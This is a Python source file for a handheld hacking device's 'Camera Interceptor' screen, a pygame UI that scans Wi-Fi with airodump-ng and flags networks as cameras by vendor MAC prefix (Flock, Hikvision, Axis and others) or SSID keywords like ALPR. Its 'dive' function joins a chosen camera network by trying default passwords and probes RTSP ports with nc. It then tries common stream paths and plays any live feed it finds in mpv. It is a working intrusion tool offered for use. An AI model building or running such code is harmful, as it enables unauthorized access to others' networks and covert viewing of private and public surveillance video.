"""Camera Interceptor — Tactical "Dive" interception of local cameras."""
from __future__ import annotations

import os
import re
import signal
import subprocess
import threading
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import TYPE_CHECKING, Dict, List, Optional

import pygame

from bigbox import hardware, theme
from bigbox.events import Button, ButtonEvent
from bigbox.ui.wifi_attack import AP, _list_wlan_ifaces, _read_airodump_csv

if TYPE_CHECKING:
    from bigbox.app import App

@dataclass
class CameraTarget:
    ssid: str
    bssid: str
    encryption: str
    channel: int
    power: int
    vendor: str = "Unknown"
    is_cam: bool = False

PHASE_SCAN = "scan"
PHASE_DIVING = "diving"
PHASE_PROBING = "probing"
PHASE_VIEW = "view"

LOOT_DIR = Path("loot/cams")

class CameraInterceptorView:
    def __init__(self) -> None:
        self.dismissed = False
        self.phase = PHASE_SCAN
        self.status_msg = "SCANNING SPECTRUM..."
        
        self.targets: Dict[str, CameraTarget] = {}
        self.selected_idx = 0
        self.scroll = 0
        
        self.ifaces = _list_wlan_ifaces()
        self.mon_iface: str | None = None
        self.client_iface: str = "wlan0" # Default for connecting
        
        self._stop = False
        self._airodump: Optional[subprocess.Popen] = None
        self._playing_proc: Optional[subprocess.Popen] = None
        self._capture_csv: Optional[Path] = None
        
        self.f_title = pygame.font.Font(None, 32)
        self.f_main = pygame.font.Font(None, 24)
        self.f_small = pygame.font.Font(None, 20)
        
        if self.ifaces:
            # Use wlan1 for scanning if available, keep wlan0 for the 'dive'
            scan_iface = self.ifaces[-1].name
            self.client_iface = self.ifaces[0].name
            threading.Thread(target=self._enable_monitor, args=(scan_iface,), daemon=True).start()

    def _enable_monitor(self, iface: str):
        mon = hardware.enable_monitor(iface)
        if mon:
            self.mon_iface = mon
            self._start_scan()
        else:
            self.status_msg = "MONITOR_INIT_FAIL"

    def _start_scan(self):
        LOOT_DIR.mkdir(parents=True, exist_ok=True)
        prefix = (LOOT_DIR / f"interceptor_{int(time.time())}").absolute()
        self._capture_csv = Path(str(prefix) + "-01.csv")

        try:
            self._airodump = subprocess.Popen(
                ["airodump-ng", "--output-format", "csv", "-w", str(prefix), self.mon_iface],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid
            )
            threading.Thread(target=self._poll_csv, daemon=True).start()
        except Exception as e:
            self.status_msg = f"SCAN_ERR: {e}"

    def _poll_csv(self):
        while not self._stop:
            if self._capture_csv and self._capture_csv.exists():
                aps, _ = _read_airodump_csv(self._capture_csv)
                for ap in aps:
                    mac = ap.bssid.upper()
                    vendor = self._get_vendor(mac)
                    # Broaden detection for tactical cams
                    is_cam = any(x in vendor.upper() for x in ["AXIS", "BOSCH", "HIKVISION", "DAHUA", "SAMSUNG", "PELCO", "HANWHA", "VIVOTEK"]) or \
                             any(x in ap.ssid.upper() for x in ["CAM", "TRAFFIC", "ALPR", "SAFETY", "WATCH", "EYE"])
                    
                    self.targets[mac] = CameraTarget(
                        ssid=ap.ssid,
                        bssid=mac,
                        encryption=ap.encryption,
                        channel=ap.channel,
                        power=ap.power,
                        vendor=vendor,
                        is_cam=is_cam
                    )
            time.sleep(1.5)

    def _get_vendor(self, mac: str) -> str:
        prefix = mac.replace(":", "")[:6].upper()
        ouis = {
            "744CA1": "Flock", "9C2F9D": "Flock", "00408C": "Axis", 
            "0013B9": "Bosch", "B0C554": "Hikvision", "A41437": "Dahua",
            "000918": "Samsung", "00166C": "Hanwha"
        }
        return ouis.get(prefix, "Unknown")

    def _dive_into_camera(self, target: CameraTarget):
        """Attempts to pivot into the camera's private Wi-Fi network."""
        self.phase = PHASE_DIVING
        self.status_msg = f"DIVING INTO {target.ssid or target.bssid}..."
        
        def _worker():
            # 1. Temporarily stop monitor mode to free up radio
            if self.mon_iface:
                subprocess.run(["airmon-ng", "stop", self.mon_iface], capture_output=True)
            
            # 2. Attempt connection via nmcli
            # For public cams, often 'OPEN' or default 'admin123/password'
            cmd = ["sudo", "nmcli", "dev", "wifi", "connect", target.bssid]
            if "WPA" in target.encryption:
                # Try common default camera passwords
                for pw in ["admin123", "password", "12345678"]:
                    res = subprocess.run(cmd + ["password", pw], capture_output=True, text=True)
                    if res.returncode == 0: break
            else:
                subprocess.run(cmd, capture_output=True)

            # 3. If connected, probe for RTSP
            self.phase = PHASE_PROBING
            self.status_msg = "PROBING FOR VIDEO STREAMS..."
            
            # Find gateway (the camera)
            try:
                gw_res = subprocess.check_output("ip route | grep default | awk '{print $3}'", shell=True, text=True).strip()
                target_ip = gw_res if gw_res else "192.168.1.1"
                
                # Check RTSP port
                ports = [554, 8554, 80, 8000, 8080]
                found_url = None
                for p in ports:
                    # Quick nc probe
                    test = subprocess.run(["nc", "-zv", "-w", "1", target_ip, str(p)], capture_output=True)
                    if test.returncode == 0:
                        # Success! Try common RTSP paths
                        paths = ["/live", "/Streaming/Channels/101", "/cam/realmonitor?channel=1&subtype=0", "/mjpeg"]
                        for path in paths:
                            url = f"rtsp://{target_ip}:{p}{path}"
                            if p == 80 or p == 8080: url = f"http://{target_ip}:{p}{path}"
                            
                            # Test if playable via ffprobe
                            probe = subprocess.run(["ffprobe", "-v", "error", "-timeout", "2000000", url], capture_output=True)
                            if probe.returncode == 0:
                                found_url = url
                                break
                    if found_url: break
                
                if found_url:
                    self._play_stream(found_url)
                else:
                    self.status_msg = "NO EXPOSED STREAMS FOUND"
                    time.sleep(3)
                    self._cleanup_dive()
            except Exception as e:
                self.status_msg = f"DIVE_FAILED: {e}"
                time.sleep(3)
                self._cleanup_dive()

        threading.Thread(target=_worker, daemon=True).start()

    def _play_stream(self, url: str):
        self.phase = PHASE_VIEW
        self.status_msg = f"INTERCEPTING LIVE FEED..."
        env = os.environ.copy()
        env.setdefault("DISPLAY", ":0")
        cmd = ["mpv", "--vo=x11", "--fs", "--no-osc", "--no-audio", url]
        try:
            self._playing_proc = subprocess.Popen(cmd, stdin=subprocess.DEVNULL, env=env)
        except:
            self._cleanup_dive()

    def _cleanup_dive(self):
        self.phase = PHASE_SCAN
        if self._playing_proc:
            self._playing_proc.terminate()
            self._playing_proc = None
        # Restore hardware
        hardware.ensure_wifi_managed()
        if self.ifaces:
            self._enable_monitor(self.ifaces[-1].name)

    def handle(self, ev: ButtonEvent, ctx: App) -> None:
        if not ev.pressed: return
        
        if self.phase == PHASE_VIEW:
            if ev.button in (Button.A, Button.B):
                self._cleanup_dive()
            return

        if ev.button is Button.B:
            self._cleanup()
            self.dismissed = True
        elif ev.button is Button.UP:
            self.selected_idx = max(0, self.selected_idx - 1)
        elif ev.button is Button.DOWN:
            self.selected_idx = min(len(self.targets) - 1, self.selected_idx + 1)
        elif ev.button is Button.A:
            sorted_targets = sorted(self.targets.values(), key=lambda x: x.power, reverse=True)
            if sorted_targets:
                self._dive_into_camera(sorted_targets[self.selected_idx])

    def _cleanup(self):
        self._stop = True
        if self._airodump:
            try: os.killpg(os.getpgid(self._airodump.pid), signal.SIGINT)
            except: pass
        if self.mon_iface:
            subprocess.run(["airmon-ng", "stop", self.mon_iface], stdout=subprocess.DEVNULL)
        hardware.ensure_wifi_managed()

    def render(self, surf: pygame.Surface) -> None:
        if self.phase == PHASE_VIEW and self._playing_proc and self._playing_proc.poll() is not None:
            self._cleanup_dive()

        surf.fill(theme.BG)
        head_h = 44
        pygame.draw.rect(surf, theme.BG_ALT, (0, 0, theme.SCREEN_W, head_h))
        pygame.draw.line(surf, theme.ACCENT, (0, head_h-1), (theme.SCREEN_W, head_h-1), 2)
        surf.blit(self.f_title.render("RECON :: CAMERA_INTERCEPTOR", True, theme.ACCENT), (theme.PADDING, 8))
        
        # Target List
        list_rect = pygame.Rect(10, head_h + 10, 480, theme.SCREEN_H - head_h - 60)
        pygame.draw.rect(surf, (10, 10, 15), list_rect)
        pygame.draw.rect(surf, theme.DIVIDER, list_rect, 1)
        
        sorted_targets = sorted(self.targets.values(), key=lambda x: x.power, reverse=True)
        for i, t in enumerate(sorted_targets):
            y = list_rect.y + i * 40
            if y > list_rect.bottom - 40: break
            sel = i == self.selected_idx
            if sel: pygame.draw.rect(surf, (30, 30, 50), (15, y, 460, 35), border_radius=4)
            
            color = theme.ACCENT if t.is_cam else theme.FG
            name = t.ssid if t.ssid else f"[{t.bssid}]"
            surf.blit(self.f_main.render(name[:30], True, color), (25, y + 8))
            surf.blit(self.f_small.render(f"{t.power}dBm", True, theme.FG_DIM), (400, y + 10))

        # Detail Panel
        if sorted_targets:
            self._render_detail(surf, sorted_targets[self.selected_idx], 510, head_h + 20)

        # Footer
        pygame.draw.rect(surf, (10, 10, 15), (0, theme.SCREEN_H - 35, theme.SCREEN_W, 35))
        st_col = theme.ACCENT if self.phase == PHASE_SCAN else theme.WARN
        surf.blit(self.f_small.render(f"STATUS: {self.status_msg}", True, st_col), (10, theme.SCREEN_H - 26))
        hint = "A: ATTEMPT_DIVE_INTERCEPT  B: BACK" if self.phase == PHASE_SCAN else "A/B: TERMINATE DIVE"
        h_surf = self.f_small.render(hint, True, theme.FG_DIM)
        surf.blit(h_surf, (theme.SCREEN_W - h_surf.get_width() - 10, theme.SCREEN_H - 26))

    def _render_detail(self, surf: pygame.Surface, t: CameraTarget, x: int, y: int):
        surf.blit(self.f_main.render("SIGNAL_INTEL", True, theme.ACCENT), (x, y))
        pygame.draw.line(surf, theme.DIVIDER, (x, y + 25), (theme.SCREEN_W - 20, y + 25))
        rows = [("SSID:", t.ssid or "HIDDEN"), ("BSSID:", t.bssid), ("VENDOR:", t.vendor), ("ENCR:", t.encryption), ("CHAN:", str(t.channel))]
        for i, (lbl, val) in enumerate(rows):
            surf.blit(self.f_small.render(lbl, True, theme.FG_DIM), (x, y + 40 + i * 30))
            surf.blit(self.f_small.render(val, True, theme.FG), (x + 80, y + 40 + i * 30))
        if t.is_cam:
            box = pygame.Rect(x, y + 200, 260, 60)
            pygame.draw.rect(surf, (40, 20, 0), box, border_radius=4)
            pygame.draw.rect(surf, theme.WARN, box, 1, border_radius=4)
            surf.blit(self.f_main.render("OFF-NET CAMERA UNIT", True, theme.WARN), (x + 15, y + 218))
